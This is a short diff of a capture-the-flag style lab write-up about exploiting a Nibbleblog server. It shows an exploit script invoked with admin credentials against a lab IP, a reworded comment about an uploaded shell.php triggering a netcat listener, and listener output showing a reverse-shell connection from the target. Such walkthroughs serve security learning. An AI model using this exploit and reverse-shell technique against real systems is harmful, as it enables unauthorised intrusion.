@@ -203,7 +203,7 @@ python3 exploit.py --url http://10.129.146.200/nibbleblog/ --username admin --pa
 ```
 
 ```shell
-# Visit the uploaded shell.php to trigger our nc listener and get shell access
+# Our nc listener will get triggered and grant us shell access as the user nibbler
 listening on [any] 8080 ...
 ls
 connect to [10.10.14.206] from (UNKNOWN) [10.129.146.200] 52964
